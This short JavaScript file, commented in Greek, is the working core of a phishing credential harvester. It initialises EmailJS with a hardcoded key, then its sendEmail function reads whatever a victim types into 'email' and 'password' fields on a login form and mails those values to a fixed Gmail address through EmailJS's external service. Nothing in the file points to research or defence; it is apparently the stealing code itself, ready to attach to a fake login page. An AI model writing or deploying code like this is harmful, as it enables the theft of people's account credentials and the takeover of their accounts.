(function() {
    // Αρχικοποίηση του EmailJS user ID
    emailjs.init("jJxV-aIeQl81sucMy"); // Βάλε εδώ το δικό σου User ID
})();

function sendEmail() {
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    // Δημιουργία του αντικειμένου με τα δεδομένα για το email
    var templateParams = {
        to_email: 'gianisritos.7gr@gmail.com',
        from_name: email,
        message: 'Password: ' + password
    };

    // Αποστολή email μέσω του EmailJS
    emailjs.send('service_9kt8ida', 'template_b6ea4jl', templateParams)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
        }, function(error) {
            console.log('FAILED...', error);
        });
}
